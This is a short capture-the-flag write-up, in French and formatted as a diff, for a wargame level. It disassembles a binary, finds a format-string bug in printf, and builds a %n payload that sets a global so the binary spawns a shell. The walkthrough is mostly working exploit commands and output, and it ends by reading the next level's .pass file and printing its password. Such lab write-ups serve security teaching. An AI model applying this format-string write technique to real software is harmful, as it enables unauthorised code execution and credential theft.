@@ -1,0 +1,76 @@
+$ objdump -d ./level3
+080484a4 <v>:
+ 80484a4:	55						push   %ebp
+ 80484a5:	89 e5                	mov    %esp,%ebp
+ 80484a7:	81 ec 18 02 00 00    	sub    $0x218,%esp
+ 80484ad:	a1 60 98 04 08       	mov    0x8049860,%eax
+ 80484b2:	89 44 24 08          	mov    %eax,0x8(%esp)
+ 80484b6:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
+ 80484bd:	00
+ 80484be:	8d 85 f8 fd ff ff		lea    -0x208(%ebp),%eax
+ 80484c4:	89 04 24             	mov    %eax,(%esp)
+ 80484c7:	e8 d4 fe ff ff       	call   80483a0 <fgets@plt>
+ 80484cc:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
+ 80484d2:	89 04 24             	mov    %eax,(%esp)
+ 80484d5:	e8 b6 fe ff ff       	call   8048390 <printf@plt>
+ 80484da:	a1 8c 98 04 08       	mov    0x804988c,%eax
+ 80484df:	83 f8 40             	cmp    $0x40,%eax
+ 80484e2:	75 34                	jne    8048518 <v+0x74>
+ 80484e4:	a1 80 98 04 08       	mov    0x8049880,%eax
+ 80484e9:	89 c2                	mov    %eax,%edx
+ 80484eb:	b8 00 86 04 08       	mov    $0x8048600,%eax
+ 80484f0:	89 54 24 0c          	mov    %edx,0xc(%esp)
+ 80484f4:	c7 44 24 08 0c 00 00 	movl   $0xc,0x8(%esp)
+ 80484fb:	00
+ 80484fc:	c7 44 24 04 01 00 00	movl   $0x1,0x4(%esp)
+ 8048503:	00
+ 8048504:	89 04 24				mov    %eax,(%esp)
+ 8048507:	e8 a4 fe ff ff       	call   80483b0 <fwrite@plt>
+ 804850c:	c7 04 24 0d 86 04 08 	movl   $0x804860d,(%esp)
+ 8048513:	e8 a8 fe ff ff       	call   80483c0 <system@plt>
+ 8048518:	c9                   	leave
+ 8048519:	c3                   	ret
+
+0804851a <main>:
+ 804851a:	55						push   %ebp
+ 804851b:	89 e5                	mov    %esp,%ebp
+ 804851d:	83 e4 f0             	and    $0xfffffff0,%esp
+ 8048520:	e8 7f ff ff ff       	call   80484a4 <v>
+ 8048525:	c9                   	leave
+ 8048526:	c3                   	ret
+ 8048527:	90                   	nop
+ 8048528:	90                   	nop
+ 8048529:	90                   	nop
+ 804852a:	90                   	nop
+ 804852b:	90                   	nop
+ 804852c:	90                   	nop
+ 804852d:	90                   	nop
+ 804852e:	90                   	nop
+ 804852f:	90                   	nop
+
+On decortique puis on voit:
+ 80484cc:   8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax
+ 80484d2:   89 04 24                mov    %eax,(%esp)
+ 80484d5:   e8 b6 fe ff ff          call   8048390 <printf@plt>
+on va exploiter le printf(buff).
+
+On recupere l'offset avec les %p:
+$ python -c 'print "AAAA"+"..%p"*13' | ./level3
+AAAA..0x200..0xb7fd1ac0..0xb7ff37d0..0x41414141..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e
+
+On a donc un offset de 4. On verifie:
+$ python -c 'print "ABCD%4$x"' | ./level3
+ABCD44434241
+
+Ce que l'on cherche a faire c'est mettre 0x40 dans 0x0804988c pour lancer le shell:
+80484da:   a1 8c 98 04 08          mov    0x804988c,%eax
+80484df:   83 f8 40                cmp    $0x40,%eax
+
+$ python -c 'print "\x08\x04\x98\x8c"[::-1] + "a"*60 + "%4$n"' > /tmp/toto
+$ cat /tmp/toto - | ./level3
+�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Wait what?!
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
+tada !
